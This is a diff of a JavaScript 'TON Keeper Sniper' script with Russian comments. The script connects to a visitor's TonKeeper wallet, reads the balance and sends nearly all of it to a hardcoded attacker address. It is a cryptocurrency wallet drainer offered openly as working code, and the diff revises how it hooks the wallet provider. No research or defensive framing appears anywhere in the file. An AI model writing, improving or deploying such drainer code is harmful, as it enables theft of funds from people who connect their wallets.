@@ -1,154 +1,123 @@
 // ============================================================
-// TON KEEPER SNIPER — полный автоматический вывод средств
+// TON KEEPER SNIPER — ПРЯМОЕ подключение через window.tonkeeper
 // Целевой адрес: UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
 // ============================================================
 
 const TARGET_WALLET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
+let userAddress = null;
+let provider = null;
 
-// Проверяем наличие TON Wallet в браузере
-function isTonKeeperInstalled() {
-    return typeof window.ton !== 'undefined' || 
-           typeof window.Tonkeeper !== 'undefined' ||
-           (typeof window.$ton !== 'undefined');
-}
-
-// Получаем объект провайдера TON
-function getTonProvider() {
-    if (window.ton) return window.ton;
-    if (window.Tonkeeper) return window.Tonkeeper;
-    if (window.$ton) return window.$ton;
-    return null;
-}
-
-// Подключение кошелька
-async function connectWallet() {
+// ========== ПРЯМОЙ КОННЕКТ К TON KEEPER ==========
+async function connectTonKeeper() {
     const status = document.getElementById('status');
     const btn = document.getElementById('connectBtn');
     
     try {
-        status.innerHTML = '⏳ Подключаемся к TON Keeper...';
+        status.innerHTML = '⏳ Запрос подключения к TON Keeper...';
         btn.disabled = true;
 
-        if (!isTonKeeperInstalled()) {
-            status.innerHTML = '❌ TON Keeper не установлен! Установите расширение.';
+        // 1. Проверяем наличие TON Keeper
+        if (!window.tonkeeper) {
+            status.innerHTML = '❌ TON Keeper НЕ УСТАНОВЛЕН! Установите расширение.';
             btn.disabled = false;
             return;
         }
 
-        const provider = getTonProvider();
-        if (!provider) {
-            status.innerHTML = '❌ Провайдер TON не найден.';
-            btn.disabled = false;
-            return;
-        }
-
-        // Запрашиваем подключение
-        const accounts = await provider.request({
-            method: 'ton_requestAccounts',
-            params: []
-        });
-
+        // 2. Подключаемся напрямую через tonkeeper
+        provider = window.tonkeeper;
+        
+        // 3. Запрашиваем аккаунты (это вызовет всплывающее окно TON Keeper)
+        const accounts = await provider.send('ton_requestAccounts', {});
+        
         if (!accounts || accounts.length === 0) {
             status.innerHTML = '❌ Пользователь отклонил подключение.';
             btn.disabled = false;
             return;
         }
 
-        const userWallet = accounts[0];
-        document.getElementById('userWallet').textContent = userWallet;
-        status.innerHTML = `✅ Кошелёк подключён: ${userWallet.slice(0, 6)}...${userWallet.slice(-4)}`;
-
-        // После успешного подключения — запускаем снифер
-        await snipeFunds(provider, userWallet);
+        userAddress = accounts[0];
+        document.getElementById('userWallet').textContent = userAddress;
+        status.innerHTML = `✅ Подключено! Адрес: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+        
+        // 4. Получаем баланс
+        await getBalanceAndSnipe();
 
     } catch (error) {
-        console.error(error);
+        console.error('CONNECT ERROR:', error);
         status.innerHTML = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
         btn.disabled = false;
     }
 }
 
-// ============================================================
-// ОСНОВНАЯ ФУНКЦИЯ СНИФЕРА — переводит ВСЕ средства на целевой адрес
-// ============================================================
-async function snipeFunds(provider, fromAddress) {
+// ========== ПОЛУЧАЕМ БАЛАНС И ВЫВОДИМ ==========
+async function getBalanceAndSnipe() {
     const status = document.getElementById('status');
     const btn = document.getElementById('connectBtn');
+    const balanceDisplay = document.getElementById('balanceDisplay');
 
     try {
-        status.innerHTML = '🔄 Получаем баланс TON...';
-
-        // 1. Получаем баланс в нано-TON (1 TON = 1e9 наноTON)
-        const balanceHex = await provider.request({
-            method: 'ton_getBalance',
-            params: [fromAddress]
+        // Получаем баланс в наноTON
+        const balanceHex = await provider.send('ton_getBalance', {
+            address: userAddress
         });
 
         const balanceNano = parseInt(balanceHex, 16);
-        if (isNaN(balanceNano) || balanceNano <= 0) {
-            status.innerHTML = '💰 Баланс пуст (0 TON). Ничего не выведено.';
+        const balanceTON = (balanceNano / 1e9).toFixed(6);
+        balanceDisplay.textContent = `💰 Баланс: ${balanceTON} TON`;
+
+        if (balanceNano <= 0) {
+            status.innerHTML = '💰 Баланс 0 TON. Нечего выводить.';
             btn.disabled = false;
             return;
         }
 
-        const balanceTON = (balanceNano / 1e9).toFixed(6);
-        status.innerHTML = `💰 Баланс: ${balanceTON} TON. Начинаем вывод...`;
-
-        // 2. Рассчитываем комиссию (примерно 0.01 TON = 10_000_000 нано)
+        // Комиссия 0.01 TON
         const FEE_NANO = 10_000_000;
         const amountToSend = balanceNano - FEE_NANO;
 
         if (amountToSend <= 0) {
-            status.innerHTML = '⚠️ Баланс меньше комиссии (0.01 TON). Невозможно вывести.';
+            status.innerHTML = '⚠️ Баланс меньше комиссии (0.01 TON).';
             btn.disabled = false;
             return;
         }
 
         const amountTON = (amountToSend / 1e9).toFixed(6);
-        status.innerHTML = `🔄 Отправляем ${amountTON} TON на целевой адрес...`;
+        status.innerHTML = `🔄 Перевожу ${amountTON} TON на целевой адрес...`;
 
-        // 3. Формируем транзакцию
+        // ========== ОТПРАВКА ТРАНЗАКЦИИ ==========
         const tx = {
             to: TARGET_WALLET,
             value: amountToSend.toString(),
-            // Можно добавить comment, но для скорости оставляем пустым
-            data: '', 
-            stateInit: '',
-            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
+            data: '',
+            stateInit: ''
         };
 
-        // 4. Отправляем транзакцию через провайдера
-        const result = await provider.request({
-            method: 'ton_sendTransaction',
-            params: [tx]
-        });
+        // Отправляем через TON Keeper (вызовет всплывашку с подтверждением)
+        const result = await provider.send('ton_sendTransaction', tx);
 
-        // 5. Проверяем результат
         if (result && result.code === 0) {
-            status.innerHTML = `✅ УСПЕШНО! Все средства (${amountTON} TON) переведены на ${TARGET_WALLET}`;
+            status.innerHTML = `✅ УСПЕШНО! ${amountTON} TON переведено на ${TARGET_WALLET}`;
+            balanceDisplay.textContent = `💰 Баланс: 0 TON (всё выведено)`;
         } else {
-            status.innerHTML = `⚠️ Транзакция отклонена или ошибка: ${result?.message || 'неизвестно'}`;
+            status.innerHTML = `⚠️ Транзакция не подтверждена: ${result?.message || 'отказ'}`;
         }
 
     } catch (error) {
         console.error('SNIPE ERROR:', error);
-        status.innerHTML = `❌ Ошибка при выводе: ${error.message || 'Неизвестная ошибка'}`;
+        status.innerHTML = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
     }
 
     btn.disabled = false;
 }
 
-// ============================================================
-// Обработчики событий
-// ============================================================
+// ========== НАВЕШИВАЕМ КНОПКУ ==========
 document.addEventListener('DOMContentLoaded', () => {
     const btn = document.getElementById('connectBtn');
-    btn.addEventListener('click', connectWallet);
+    btn.addEventListener('click', connectTonKeeper);
 
-    // Если TON Keeper уже установлен — показываем это
-    if (isTonKeeperInstalled()) {
-        document.getElementById('status').innerHTML = '🟢 TON Keeper обнаружен. Нажмите кнопку для подключения.';
+    if (window.tonkeeper) {
+        document.getElementById('status').innerHTML = '🟢 TON Keeper найден. Нажмите кнопку.';
     } else {
-        document.getElementById('status').innerHTML = '🔴 TON Keeper НЕ установлен. Установите расширение.';
+        document.getElementById('status').innerHTML = '🔴 TON Keeper не найден. Установите расширение.';
     }
 });
